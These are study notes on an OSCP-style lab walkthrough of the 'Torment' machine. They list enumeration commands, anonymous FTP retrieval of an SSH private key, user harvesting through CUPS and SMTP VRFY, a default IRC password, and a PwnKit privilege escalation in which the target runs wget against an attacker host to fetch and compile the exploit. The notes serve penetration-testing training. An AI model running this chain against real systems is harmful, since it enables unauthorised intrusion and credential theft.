This is a comprehensive breakdown of the methodology, commands, and key findings from the Offensive Security video "DigitalWorld.local - Torment - Walkthrough with S1REN\!" This walkthrough is an excellent representation of an OSCP-style machine, covering enumeration, a multi-stage initial foothold, and privilege escalation.

-----

## 📝 OSCP Walkthrough Notes & Commands: DigitalWorld.local - Torment

### 1\. Initial Enumeration & Service Discovery

The first step is a thorough port and service scan to identify potential entry points.

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Full Port Scan** | `nmap -p- -sV -sC [TARGET_IP] --open` | **21/FTP** (VSFTPD, Anonymous Login), **22/SSH**, **25/SMTP** (Postfix, **VRFY** capability), **80/HTTP** (Apache), **139, 445/SMB** (Samba), **631/HTTP** (CUPS 2.2.1, supports **PUT**), **2049/NFS**, **6667/IRC** (ngircd). | [[29:46](http://www.youtube.com/watch?v=kSmiFJipiZw&t=1786)] |
| **SMB Enum** | `nmap -p 139,445 --script=smb-enum-shares [TARGET_IP]` | Found shares: `backup`, `ipc`, `printer`. SMB null sessions were blocked. | [[34:17](http://www.youtube.com/watch?v=kSmiFJipiZw&t=2057)] |
| **Web Enum (80)** | `nikto --host http://[TARGET_IP]` | No critical vulnerabilities found, but confirmed out-of-date Apache. | [[46:48](http://www.youtube.com/watch?v=kSmiFJipiZw&t=2808)] |
| **Web Fuzzing** | `wfuzz -c -z file,/path/to/wordlist/raft-large-files.txt --hc 404 http://[TARGET_IP]/FUZZ` | Used to find hidden files and directories on ports 80 and 631. | [[50:12](http://www.youtube.com/watch?v=kSmiFJipiZw&t=3012)] |

-----

### 2\. Initial Foothold: User Exfiltration & Credential Discovery

The initial foothold required chaining multiple services: **FTP** led to a hidden directory, which contained information for **IRC**, and a user list was found via **CUPS** and verified with **SMTP**.

#### 2.1 FTP Anonymous Access & File Exfiltration

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **FTP Login** | `ftp [TARGET_IP]`<br>User: `anonymous`<br>Password: `anonymous` | Anonymous login was successful. | [[36:56](http://www.youtube.com/watch?v=kSmiFJipiZw&t=2216)] |
| **Hidden File Search** | `ls -lsa` | Revealed hidden service configuration directories: `.ssh`, `.ngircd`, `.mysql`, etc. | [[38:07](http://www.youtube.com/watch?v=kSmiFJipiZw&t=2287)] |
| **Retrieve Files** | `get .ssh/id_rsa`<br>`get .ngircd/channels` | Exfiltrated the **private SSH key** and a file listing **IRC channels** (`#games`, `#tormented_printer`). | [[38:39](http://www.youtube.com/watch?v=kSmiFJipiZw&t=2319)] |
| **Prepare Key** | `chmod 600 id_rsa` | Necessary step to ensure the private key can be used by SSH. | [[40:23](http://www.youtube.com/watch?v=kSmiFJipiZw&t=2423)] |

#### 2.2 CUPS Enumeration & User Harvesting

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **CUPS Manual Enum** | Browse `http://[TARGET_IP]:631` (Administration -\> Classes) | Manually navigating the web interface (CUPS) led to a list of potential usernames. | [[01:01:19](http://www.youtube.com/watch?v=kSmiFJipiZw&t=3679)] |
| **Harvest Users** | `curl [URL_WITH_USERS] \| html2text \| cut -d "'" -f 1 \| cut -d " " -f 1 \| sort -u > users_exfil` | A chain of commands was used to clean the HTML output and create a clean list of users (e.g., **patrick**, **qiu**). | [[01:03:09](http://www.youtube.com/watch?v=kSmiFJipiZw&t=3789)] |
| **Verify Users** | `nc -nv [TARGET_IP] 25`<br>`VRFY patrick`<br>`VRFY qiu` | Used the SMTP **VRFY** command to confirm which harvested names were valid system users. **patrick** and **qiu** were verified. | [[01:07:08](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4028)] |

#### 2.3 IRC Credential Discovery

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **IRC Password** | Search: `ngircd default password` | Identified a common default credential for ngircd on Debian: **we all like debian**. | [[01:14:12](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4452)] |
| **IRC Connect** | Connect with an IRC client (e.g., HexChat) to `[TARGET_IP]:6667` using the default password. | Connection was successful using the default password. | [[01:15:11](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4511)] |
| **Find SSH Passphrase** | `/j #tormented_printer` | Joining the channel revealed the **passphrase** for the exfiltrated `id_rsa` key in the channel topic. | [[01:15:58](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4558)] |

#### 2.4 SSH Login

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Initial Foothold** | `ssh -i id_rsa patrick@[TARGET_IP]`<br>Passphrase: **[FOUND\_PASSPHRASE]** | Successful login to the system as the user **patrick**. | [[01:16:44](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4604)] |

-----

### 3\. Privilege Escalation (Privesc)

The privilege escalation path involved checking for SUID binaries, which pointed to a known vulnerability in the Polkit service.

#### 3.1 Initial Checks & SUID Enumeration

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Current User Check** | `whoami`<br>`id` | Confirmed shell as `patrick`. | [[01:17:36](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4656)] |
| **SUDO Check** | `sudo -l` | Checks for programs the current user can run with root privileges. | [[01:17:55](http://www.youtube.com/watch?v=kSmiFJipiZw&t=4675)] |
| **SUID/SGID Search** | **Find SUID/SGID binaries** (e.g., using `find / -perm /6000 2>/dev/null`) | Identified the `/usr/bin/pkexec` binary running with SUID, a common vector for **Polkit (PwnKit) exploitation**. | [[01:25:00](http://www.youtube.com/watch?v=kSmiFJipiZw&t=5100)] |

#### 3.2 Polkit (PwnKit) Exploitation (CVE-2021-4034)

| Target Phase | Command | Key Findings & Notes | Timestamp |
| :--- | :--- | :--- | :--- |
| **Setup Transfer** | **Attacker:** `python3 -m http.server 8000` | Used the simple Python HTTP server to host the exploit file. | [[01:26:47](http://www.youtube.com/watch?v=kSmiFJipiZw&t=5207)] |
| **Download Exploit** | **Target:** `wget http://[ATTACKER_IP]:8000/poonkit.c` | Downloaded the C exploit code (e.g., `poonkit.c` for PwnKit). | [[01:27:07](http://www.youtube.com/watch?v=kSmiFJipiZw&t=5227)] |
| **Compile Exploit** | **Target:** `gcc poonkit.c -o offsec` | Compiling the C code into an executable binary (`offsec`). | [[01:27:31](http://www.youtube.com/watch?v=kSmiFJipiZw&t=5251)] |
| **Execute Exploit** | **Target:** `./offsec` | Execution of the PwnKit exploit successfully returned a **root shell**. | [[01:28:38](http://www.youtube.com/watch?v=kSmiFJipiZw&t=5318)] |
| **Proof** | `cat /root/proof.txt` | Final step to complete the machine and capture the proof. | [[01:31:16](http://www.youtube.com/watch?v=kSmiFJipiZw&t=5476)] |

-----

### 🔑 Key Methodological Takeaways for OSCP

1.  **Enumerate Everything:** Do not stop at the obvious. The initial foothold was a chain: **FTP** (obvious) led to hidden configs, which led to a key and IRC information. **CUPS** (less obvious) led to a user list. **SMTP** (less obvious) verified the users. **IRC** (least obvious) provided the final key component.
2.  **Look for Service Misconfigurations:** The path used default credentials on the `ngircd` service, a common theme in retired OSCP-like machines.
3.  **Cross-Reference Data:** Information exfiltrated from one service (FTP's `id_rsa` and IRC channels) was combined with information from another (CUPS's user list, IRC's passphrase) to succeed.
4.  **Know Your Vulnerabilities:** The final escalation was a classic SUID binary exploit for `pkexec`, requiring the use of a readily available exploit (PwnKit/Polkit). When you see SUID, check for known vulnerabilities on the binary.
    http://googleusercontent.com/youtube_content/0